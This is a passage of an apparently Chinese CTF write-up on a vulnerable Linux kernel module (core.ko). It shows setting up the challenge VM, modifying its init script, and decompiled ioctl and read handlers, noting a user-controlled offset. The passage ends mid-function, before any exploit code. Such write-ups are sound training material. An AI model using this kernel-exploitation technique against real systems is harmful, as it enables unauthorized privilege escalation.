<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>give_to_player_writeup</title>
  <style>
    html {
      line-height: 1.5;
      font-family: Georgia, serif;
      font-size: 20px;
      color: #1a1a1a;
      background-color: #fdfdfd;
    }
    body {
      margin: 0 auto;
      max-width: 36em;
      padding-left: 50px;
      padding-right: 50px;
      padding-top: 50px;
      padding-bottom: 50px;
      hyphens: auto;
      overflow-wrap: break-word;
      text-rendering: optimizeLegibility;
      font-kerning: normal;
    }
    @media (max-width: 600px) {
      body {
        font-size: 0.9em;
        padding: 1em;
      }
      h1 {
        font-size: 1.8em;
      }
    }
    @media print {
      body {
        background-color: transparent;
        color: black;
        font-size: 12pt;
      }
      p, h2, h3 {
        orphans: 3;
        widows: 3;
      }
      h2, h3, h4 {
        page-break-after: avoid;
      }
    }
    p {
      margin: 1em 0;
    }
    a {
      color: #1a1a1a;
    }
    a:visited {
      color: #1a1a1a;
    }
    img {
      max-width: 100%;
    }
    h1, h2, h3, h4, h5, h6 {
      margin-top: 1.4em;
    }
    h5, h6 {
      font-size: 1em;
      font-style: italic;
    }
    h6 {
      font-weight: normal;
    }
    ol, ul {
      padding-left: 1.7em;
      margin-top: 1em;
    }
    li > ol, li > ul {
      margin-top: 0;
    }
    blockquote {
      margin: 1em 0 1em 1.7em;
      padding-left: 1em;
      border-left: 2px solid #e6e6e6;
      color: #606060;
    }
    code {
      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
      font-size: 85%;
      margin: 0;
    }
    pre {
      margin: 1em 0;
      overflow: auto;
    }
    pre code {
      padding: 0;
      overflow: visible;
      overflow-wrap: normal;
    }
    .sourceCode {
     background-color: transparent;
     overflow: visible;
    }
    hr {
      background-color: #1a1a1a;
      border: none;
      height: 1px;
      margin: 1em 0;
    }
    table {
      margin: 1em 0;
      border-collapse: collapse;
      width: 100%;
      overflow-x: auto;
      display: block;
      font-variant-numeric: lining-nums tabular-nums;
    }
    table caption {
      margin-bottom: 0.75em;
    }
    tbody {
      margin-top: 0.5em;
      border-top: 1px solid #1a1a1a;
      border-bottom: 1px solid #1a1a1a;
    }
    th {
      border-top: 1px solid #1a1a1a;
      padding: 0.25em 0.5em 0.25em 0.5em;
    }
    td {
      padding: 0.125em 0.5em 0.25em 0.5em;
    }
    header {
      margin-bottom: 4em;
      text-align: center;
    }
    #TOC li {
      list-style: none;
    }
    #TOC ul {
      padding-left: 1.3em;
    }
    #TOC > ul {
      padding-left: 0;
    }
    #TOC a:not(:hover) {
      text-decoration: none;
    }
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    span.underline{text-decoration: underline;}
    div.column{display: inline-block; vertical-align: top; width: 50%;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
        color: #aaaaaa;
      }
    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
    div.sourceCode
      {   }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
    code span.at { color: #7d9029; } /* Attribute */
    code span.bn { color: #40a070; } /* BaseN */
    code span.bu { } /* BuiltIn */
    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #4070a0; } /* Char */
    code span.cn { color: #880000; } /* Constant */
    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
    code span.dt { color: #902000; } /* DataType */
    code span.dv { color: #40a070; } /* DecVal */
    code span.er { color: #ff0000; font-weight: bold; } /* Error */
    code span.ex { } /* Extension */
    code span.fl { color: #40a070; } /* Float */
    code span.fu { color: #06287e; } /* Function */
    code span.im { } /* Import */
    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
    code span.op { color: #666666; } /* Operator */
    code span.ot { color: #007020; } /* Other */
    code span.pp { color: #bc7a00; } /* Preprocessor */
    code span.sc { color: #4070a0; } /* SpecialChar */
    code span.ss { color: #bb6688; } /* SpecialString */
    code span.st { color: #4070a0; } /* String */
    code span.va { color: #19177c; } /* Variable */
    code span.vs { color: #4070a0; } /* VerbatimString */
    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<h1 id="ctf-kernelgive-to-player">ctf-kernel:give to player</h1>
<h2 id="题目">1. 题目</h2>
<p>压缩文件core_give.tar的内容</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give$</span> tar <span class="at">-tf</span> core_give.tar</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">give_to_player/</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">give_to_player/bzImage</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">give_to_player/core.cpio</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">give_to_player/start.sh</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">give_to_player/vmlinux</span></span></code></pre></div>
<p>加压得到，并修改start.sh后得到如下信息：</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$</span> cat start.sh</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-system-x86_64</span> <span class="dt">\</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>-m 64M <span class="dt">\</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>-kernel ./bzImage <span class="dt">\</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>-initrd  ./core.cpio <span class="dt">\</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> <span class="dt">\</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>-s  <span class="dt">\</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>-netdev user,id=t0, <span class="at">-device</span> e1000,netdev=t0,id=nic0 <span class="dt">\</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>-nographic  <span class="dt">\</span></span></code></pre></div>
<p>这里将内存修改位512M后成功启动（默认64M无法启动）（来自参考的提醒）</p>
<p>根据参考文件的说法，init脚本中存在poweroff命令，因此需要我们修改init脚本，并重新打包rootfs</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxrwxr-x</span> 1 ash ash 40738712 3月  24  2018 vmlinux<span class="pp">*</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$</span> file core.cpio</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">core.cpio:</span> gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size modulo 2^32 53442048</span></code></pre></div>
<p>发现core.cpio是gzip压缩文件，通过如下的命令解压，并从新制作新的rootfs</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mv</span> core.cpio core.cpio.gz</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">gzip</span> <span class="at">-d</span> core.cpio.gz</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> rootfs</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> rootfs</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cpio</span> <span class="at">-idmv</span> <span class="op">&lt;</span>../core.cpio</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> .<span class="kw">|</span><span class="fu">cpio</span> <span class="at">-o</span> <span class="at">-H</span> newc <span class="op">&gt;</span>../new_rootfs.cpio</span></code></pre></div>
<p>修改后的init脚本：</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a> <span class="co">#!/bin/sh</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a> <span class="fu">mount</span> <span class="at">-t</span> proc proc /proc</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a> <span class="fu">mount</span> <span class="at">-t</span> sysfs sysfs /sys</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a> <span class="fu">mount</span> <span class="at">-t</span> devtmpfs none /dev</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a> <span class="ex">/sbin/mdev</span> <span class="at">-s</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a> <span class="fu">mkdir</span> <span class="at">-p</span> /dev/pts</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a> <span class="fu">mount</span> <span class="at">-vt</span> devpts <span class="at">-o</span> gid=4,mode=620 none /dev/pts</span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a> <span class="fu">chmod</span> 666 /dev/ptmx</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a> <span class="fu">cat</span> /proc/kallsyms <span class="op">&gt;</span> /tmp/kallsyms</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a> <span class="bu">echo</span> 1 <span class="op">&gt;</span> /proc/sys/kernel/kptr_restrict</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a> <span class="bu">echo</span> 1 <span class="op">&gt;</span> /proc/sys/kernel/dmesg_restrict</span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a> <span class="ex">ifconfig</span> eth0 up</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a> <span class="ex">udhcpc</span> <span class="at">-i</span> eth0</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a> <span class="ex">ifconfig</span> eth0 10.0.2.15 netmask 255.255.255.0</span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a> <span class="ex">route</span> add default gw 10.0.2.2</span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a> <span class="ex">insmod</span> /core.ko</span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a> <span class="co">#poweroff -d 120 -f &amp;</span></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a> <span class="ex">setsid</span> /bin/cttyhack setuidgid 1000 /bin/sh</span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a> <span class="bu">echo</span> <span class="st">&#39;sh end!\n&#39;</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a> <span class="fu">umount</span> /proc</span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a> <span class="fu">umount</span> /sys</span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a> <span class="ex">poweroff</span> <span class="at">-d</span> 0  <span class="at">-f</span></span></code></pre></div>
<p>修改start.sh脚本中的initrd参数即可：</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">qemu-system-x86_64</span> <span class="dt">\</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>-m 512M <span class="dt">\</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>-kernel ./bzImage <span class="dt">\</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>-initrd  ./new_rootfs.cpio <span class="dt">\</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> <span class="dt">\</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>-s  <span class="dt">\</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>-netdev user,id=t0, <span class="at">-device</span> e1000,netdev=t0,id=nic0 <span class="dt">\</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>-nographic  <span class="dt">\</span></span></code></pre></div>
<p>注意这里使用-s，因此可以使用gdb调试内核。</p>
<h2 id="分析">2. 分析</h2>
<h3 id="环境信息分析">2.1. 环境信息分析</h3>
<p>启动后的内容：</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ls <span class="at">-al</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 47028</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>   13 chal     chal             0 Apr 21 13:32 .</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>   13 chal     chal             0 Apr 21 13:32 ..</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>    1 chal     chal           156 Apr 21 13:50 .ash_history</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:18 bin</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw-r--</span>    1 chal     chal          6984 Apr 21 13:18 core.ko</span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>    8 root     root          2320 Apr 21 13:32 dev</span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:18 etc</span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxrwxr-x</span>    1 chal     chal            66 Apr 21 13:18 gen_cpio.sh</span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxrwxr-x</span>    1 chal     chal           559 Apr 21 13:22 init</span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    3 chal     chal             0 Apr 21 13:18 lib</span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:18 lib64</span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwxrwxrwx</span>    1 chal     chal            11 Apr 21 13:18 linuxrc <span class="at">-</span><span class="op">&gt;</span> bin/busybox</span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">dr-xr-xr-x</span>   51 root     root             0 Apr 21 13:32 proc</span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:18 root</span>
<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:18 sbin</span>
<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="ex">dr-xr-xr-x</span>   12 root     root             0 Apr 21 13:32 sys</span>
<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    2 chal     chal             0 Apr 21 13:32 tmp</span>
<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span>    4 chal     chal             0 Apr 21 13:18 usr</span>
<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxrwxr-x</span>    1 chal     chal      48134320 Apr 21 13:18 vmlinux</span>
<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ </span></code></pre></div>
<p>分析core.ko</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs$</span> file core.ko</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">core.ko:</span> ELF 64-bit LSB relocatable, x86-64, version 1 <span class="er">(</span><span class="ex">SYSV</span><span class="kw">)</span><span class="ex">,</span> BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs$</span> checksec core.ko</span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> <span class="st">&#39;/home/ash/03.ctf/10.kernel/01.core_give/give_to_player/core_rootfs/rootfs/core.ko&#39;</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Arch:</span>     amd64-64-little</span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RELRO:</span>    No RELRO</span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Stack:</span>    Canary found</span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NX:</span>       NX enabled</span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">PIE:</span>      No PIE <span class="er">(</span><span class="ex">0x0</span><span class="kw">)</span></span></code></pre></div>
<p>存在栈保护和NX保护</p>
<p>使用IDA打开：</p>
<p>init_module函数逻辑如下：</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>__int64 init_module<span class="op">()</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  core_proc <span class="op">=</span> proc_create<span class="op">(</span><span class="st">&quot;core&quot;</span><span class="op">,</span> <span class="dv">438</span><span class="bu">LL</span><span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">,</span> <span class="op">&amp;</span>core_fops<span class="op">);</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_2DE<span class="op">);</span></span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>proc_create函数原型如下：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> proc_dir_entry <span class="op">*</span>proc_create<span class="op">(</span><span class="dt">const</span> <span class="dt">char</span> <span class="op">*</span>name<span class="op">,</span> umode_t mode<span class="op">,</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>                   <span class="kw">struct</span> proc_dir_entry <span class="op">*</span>parent<span class="op">,</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>                   <span class="dt">const</span> <span class="kw">struct</span> proc_ops <span class="op">*</span>proc_ops<span class="op">)</span></span></code></pre></div>
<p>根据分析proc_ops中定义函数只有3个：core_write、core_ioctl和offset
core_release</p>
<p>因此可以调用ioctrl，write等操作/proc/core目录，/proc/core信息如下：</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ls <span class="at">-al</span> /proc/core</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw-rw-</span>    1 root     root             0 Apr 21 14:01 /proc/core</span></code></pre></div>
<p>可以通过open(‘/proc/core’，…)来操作</p>
<h3 id="代码和漏洞分析">2.2. 代码和漏洞分析</h3>
<p>首先check下core_ioctl函数逻辑：</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall core_ioctl<span class="op">(</span>__int64 a1<span class="op">,</span> <span class="dt">int</span> a2<span class="op">,</span> __int64 a3<span class="op">)</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">switch</span> <span class="op">(</span> a2 <span class="op">)</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> <span class="bn">0x6677889B</span><span class="op">:</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>      core_read<span class="op">(</span>a3<span class="op">);</span></span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> <span class="bn">0x6677889C</span><span class="op">:</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>      printk<span class="op">(&amp;</span>unk_2CD<span class="op">);</span></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>      off <span class="op">=</span> a3<span class="op">;</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">case</span> <span class="bn">0x6677889A</span><span class="op">:</span></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>      printk<span class="op">(&amp;</span>unk_2B3<span class="op">);</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>      core_copy_func<span class="op">(</span>a3<span class="op">);</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<ul>
<li><p>命令0x6677889B触发read操作</p></li>
<li><p>命令0x6677889C设置off，这里的off是外部可控制的</p></li>
<li><p>命令0x6677889A触发core_copy_func操作</p></li>
</ul>
<p>在分析core_read函数：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">unsigned</span> __int64 __fastcall core_read<span class="op">(</span>__int64 a1<span class="op">)</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>v2<span class="op">;</span> <span class="co">// rdi</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>  __int64 i<span class="op">;</span> <span class="co">// rcx</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">unsigned</span> __int64 result<span class="op">;</span> <span class="co">// rax</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> v5<span class="op">[</span><span class="dv">64</span><span class="op">];</span> <span class="co">// [rsp+0h] [rbp-50h] BYREF</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">unsigned</span> __int64 v6<span class="op">;</span> <span class="co">// [rsp+40h] [rbp-10h]</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>  v6 <span class="op">=</span> __readgsqword<span class="op">(</span><span class="bn">0x28</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_25B<span class="op">);</span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>  printk<span class="op">(&amp;</span>unk_275<span class="op">);</span></span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>  v2 <span class="op">=</span> v5<span class="op">;</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span> i <span class="op">=</span> <span class="dv">16</span><span class="bu">LL</span><span class="op">;</span> i<span class="op">;</span> <span class="op">--</span>i <span class="op">)</span></span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_DWORD <span class="op">*)</span>v2 <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
